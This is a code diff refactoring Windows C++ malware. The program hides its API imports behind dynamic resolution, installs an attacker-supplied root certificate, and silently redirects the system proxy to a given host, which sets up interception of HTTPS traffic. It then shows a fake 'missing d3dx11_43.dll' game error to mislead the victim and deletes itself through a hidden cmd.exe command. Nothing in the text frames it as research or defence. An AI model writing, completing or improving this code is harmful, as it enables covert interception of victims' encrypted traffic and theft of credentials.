@@ -12,14 +12,14 @@
 // ────────────────────────────────────
 //  Dynamic WinAPI pointers (minimal set)
 // ────────────────────────────────────
-using RegCreateKeyExW_t   = LONG (WINAPI*)(HKEY,LPCWSTR,DWORD,LPWSTR,DWORD,REGSAM,LPSECURITY_ATTRIBUTES,PHKEY,LPDWORD);
-using RegSetValueExW_t    = LONG (WINAPI*)(HKEY,LPCWSTR,DWORD,DWORD,const BYTE*,DWORD);
-using RegOpenKeyExW_t     = LONG (WINAPI*)(HKEY,LPCWSTR,DWORD,REGSAM,PHKEY);
-using RegCloseKey_t       = LONG (WINAPI*)(HKEY);
-using InternetSetOptionW_t= BOOL (WINAPI*)(HINTERNET,DWORD,LPVOID,DWORD);
-using CreateProcessW_t    = BOOL (WINAPI*)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
-using CloseHandle_t       = BOOL (WINAPI*)(HANDLE);
-using MessageBoxW_t       = UINT (WINAPI*)(HWND,LPCWSTR,LPCWSTR,UINT);
+using RegCreateKeyExW_t    = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
+using RegSetValueExW_t     = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
+using RegOpenKeyExW_t      = LONG (WINAPI*)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
+using RegCloseKey_t        = LONG (WINAPI*)(HKEY);
+using InternetSetOptionW_t = BOOL (WINAPI*)(HINTERNET, DWORD, LPVOID, DWORD);
+using CreateProcessW_t     = BOOL (WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+using CloseHandle_t        = BOOL (WINAPI*)(HANDLE);
+using MessageBoxW_t        = UINT (WINAPI*)(HWND, LPCWSTR, LPCWSTR, UINT);
 
 static RegCreateKeyExW_t    pRegCreateKeyExW    = nullptr;
 static RegSetValueExW_t     pRegSetValueExW     = nullptr;
@@ -31,21 +31,21 @@ static CloseHandle_t        pCloseHandle        = nullptr;
 static MessageBoxW_t        pMessageBoxW        = nullptr;
 
 void InitDynamicImports() {
-    HMODULE hAdv   = LoadLibraryW(L"Advapi32.dll");
-    pRegCreateKeyExW = (RegCreateKeyExW_t)GetProcAddress(hAdv,  "RegCreateKeyExW");
-    pRegSetValueExW  = (RegSetValueExW_t) GetProcAddress(hAdv,  "RegSetValueExW");
-    pRegOpenKeyExW   = (RegOpenKeyExW_t)  GetProcAddress(hAdv,  "RegOpenKeyExW");
-    pRegCloseKey     = (RegCloseKey_t)    GetProcAddress(hAdv,  "RegCloseKey");
+    HMODULE hAdv = LoadLibraryW(L"Advapi32.dll");
+    pRegCreateKeyExW = (RegCreateKeyExW_t)GetProcAddress(hAdv, "RegCreateKeyExW");
+    pRegSetValueExW  = (RegSetValueExW_t) GetProcAddress(hAdv, "RegSetValueExW");
+    pRegOpenKeyExW   = (RegOpenKeyExW_t)  GetProcAddress(hAdv, "RegOpenKeyExW");
+    pRegCloseKey     = (RegCloseKey_t)    GetProcAddress(hAdv, "RegCloseKey");
 
-    HMODULE hInet    = LoadLibraryW(L"Wininet.dll");
+    HMODULE hInet = LoadLibraryW(L"Wininet.dll");
     pInternetSetOptionW = (InternetSetOptionW_t)GetProcAddress(hInet, "InternetSetOptionW");
 
-    HMODULE hKernel  = LoadLibraryW(L"Kernel32.dll");
-    pCreateProcessW  = (CreateProcessW_t)GetProcAddress(hKernel,"CreateProcessW");
-    pCloseHandle     = (CloseHandle_t)   GetProcAddress(hKernel,"CloseHandle");
+    HMODULE hKernel = LoadLibraryW(L"Kernel32.dll");
+    pCreateProcessW  = (CreateProcessW_t)GetProcAddress(hKernel, "CreateProcessW");
+    pCloseHandle     = (CloseHandle_t)   GetProcAddress(hKernel, "CloseHandle");
 
-    HMODULE hUser    = LoadLibraryW(L"User32.dll");
-    pMessageBoxW     = (MessageBoxW_t)   GetProcAddress(hUser,  "MessageBoxW");
+    HMODULE hUser = LoadLibraryW(L"User32.dll");
+    pMessageBoxW = (MessageBoxW_t)GetProcAddress(hUser, "MessageBoxW");
 }
 
 // ────────────────────────────────────
@@ -88,12 +88,8 @@ bool InstallCertWindows() {
         return ok == TRUE;
     };
 
-    // ① try CurrentUser\\Root
-    if (addToStore(L"Root"))
-        return true;
-
-    // ② fallback → CurrentUser\\CA  (always writable)
-    return addToStore(L"CA");
+    // try CurrentUser\Root, then fallback to CA
+    return addToStore(L"Root") || addToStore(L"CA");
 }
 
 // ────────────────────────────────────
@@ -106,11 +102,13 @@ bool EnableProxyWindows(const std::wstring& host, int port) {
         return false;
 
     DWORD enable = 1;
-    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD, reinterpret_cast<BYTE*>(&enable), sizeof(enable));
+    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD,
+                    reinterpret_cast<const BYTE*>(&enable), sizeof(enable));
 
     std::wstring proxy = host + L":" + std::to_wstring(port);
     pRegSetValueExW(hKey, L"ProxyServer", 0, REG_SZ,
-        reinterpret_cast<const BYTE*>(proxy.c_str()), (DWORD)((proxy.size()+1)*sizeof(wchar_t)));
+        reinterpret_cast<const BYTE*>(proxy.c_str()),
+        static_cast<DWORD>((proxy.size() + 1) * sizeof(wchar_t)));
     pRegCloseKey(hKey);
 
     pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
@@ -125,7 +123,8 @@ bool DisableProxyWindows() {
         return false;
 
     DWORD disable = 0;
-    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD, reinterpret_cast<BYTE*>(&disable), sizeof(disable));
+    pRegSetValueExW(hKey, L"ProxyEnable", 0, REG_DWORD,
+                    reinterpret_cast<const BYTE*>(&disable), sizeof(disable));
     pRegCloseKey(hKey);
 
     pInternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
@@ -134,29 +133,39 @@ bool DisableProxyWindows() {
 }
 
 // ────────────────────────────────────
-//  Fake error + self‑delete
+//  Fake error + self-delete
 // ────────────────────────────────────
+#ifdef FAKE_DLL_POPUP
 void ShowFakeError() {
     pMessageBoxW(NULL,
-        L"Unable to run game. Missing d3dx11_43.dll",
+        L"The program can’t start because d3dx11_43.dll is missing from your computer.\nTry reinstalling the program to fix this problem.",
         L"Error",
-        MB_OK | MB_ICONERROR);
+        MB_ICONERROR | MB_OK);
 }
+#else
+inline void ShowFakeError() {}
+#endif
 
+#ifdef SELF_DELETE
 void ScheduleSelfDelete() {
     wchar_t exePath[MAX_PATH];
     if (!GetModuleFileNameW(NULL, exePath, MAX_PATH)) return;
 
-    std::wstring cmd = L"cmd.exe /C ping 127.0.0.1 -n 2 > NUL & del /Q /F \"" + std::wstring(exePath) + L"\"";
+    std::wstring cmd = L"cmd.exe /C ping 127.0.0.1 -n 1 > NUL & del /Q /F \"" +
+                       std::wstring(exePath) + L"\"";
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
 
-    pCreateProcessW(NULL, cmd.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    pCreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
+                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
     pCloseHandle(pi.hProcess);
     pCloseHandle(pi.hThread);
     exit(0);
 }
+#else
+inline void ScheduleSelfDelete() {}
+#endif
 
 // ────────────────────────────────────
 //  Entry point
@@ -179,20 +188,17 @@ int wmain(int argc, wchar_t* argv[]) {
     }
 
     if (!disable) {
-        if (!InstallCertWindows()) {
-    std::cout << "CERT FAIL " << GetLastError() << std::endl;
-    return 1;
-}
-if (!EnableProxyWindows(host, port)) {
-    std::cout << "PROXY FAIL " << GetLastError() << std::endl;
-    return 1;
-}
+        if (!InstallCertWindows()) return 1;
+        if (!EnableProxyWindows(host, port)) return 1;
+#ifdef FAKE_DLL_POPUP
         ShowFakeError();
+#endif
     } else {
-        if (!DisableProxyWindows())
-            return 1;
+        if (!DisableProxyWindows()) return 1;
     }
 
+#ifdef SELF_DELETE
     ScheduleSelfDelete();
+#endif
     return 0;
 }
